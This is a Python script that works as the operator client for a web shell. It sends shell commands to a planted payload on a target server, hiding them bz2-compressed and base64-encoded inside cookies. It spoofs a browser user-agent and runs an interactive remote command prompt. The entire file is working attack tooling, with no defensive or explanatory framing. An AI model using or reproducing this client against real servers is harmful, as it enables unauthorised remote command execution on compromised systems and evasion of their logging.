#!/usr/bin/env python3
from requests import Session, exceptions
from string import ascii_lowercase, digits
from random import choices
from sys import argv
from base64 import b64decode, b64encode
from bz2 import decompress as bz2decode, compress as bz2encode

USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
SHELL_PROMPT = "\033[30;42m(shell)>\033[0m "
CANNOT_CONNECT_PAYLOAD = " [\033[91m×\033[0m] Cannot connect to the payload."
CANNOT_CONNECT_SERVER = " [\033[91m×\033[0m] Cannot connect to the server."
CONNECTED = " [\033[92m✓\033[0m] Connected to the payload."
BAD_RESPONSE = " [\033[91m×\033[0m] Bad response.\n"
WARNING_500 = " \033[101;30mWARNING. RETURNED 500.\033[0m"

def randomstring(n):
    return ''.join(choices(ascii_lowercase + digits, k=n))

def encode(text):
    data = text.encode("ascii")
    data = bz2encode(data, 9)
    data = b64encode(data)
    return data.decode("ascii")

def decode(text):
    data = text.encode("utf-8")
    data = b64decode(data)
    data = bz2decode(data)
    return data.decode("utf-8")

def req(url, command, session):
    s = session
    delimeter = randomstring(10)

    d = encode(delimeter)
    c = encode(command)
    headers = {"user-agent":USERAGENT}

    try:
        result = s.get(url, cookies={'c':c, 'd':d}, headers=headers)
    except exceptions.ConnectionError:
        return (None, False)

    if result.status_code == 200:
        try:
            output = result.text.split(delimeter)[1]
            return (decode(output), True)
        except:
            return (BAD_RESPONSE, True)
    elif result.status_code == 500:
        return (WARNING_500, False)
    else:
        return (None, False)

def test_connection(url, session):
    delimeter = randomstring(10)
    command = 'echo -n "%s"' % delimeter
    data, status = req(url, command, session)

    if data != delimeter:
        print(CANNOT_CONNECT_PAYLOAD)
        return False
    elif status == False:
        print(CANNOT_CONNECT_SERVER)
        return False
    else:
        return True

def shell(url):
    s = Session()
    if test_connection(url, s):
        print(CONNECTED)
    else:
        return

    while True:
        try:
            command = input(SHELL_PROMPT)
            if command == "exit":
                return
            result, status = req(url, command, s)
            if status:
                print(result, end="")
            else:
                print(CANNOT_CONNECT_PAYLOAD)
        except KeyboardInterrupt:
            print("")
            return

def main():
    if len(argv) < 2:
        print("Missing url")
        return 1
    shell(argv[1])

if __name__ == "__main__":
    main()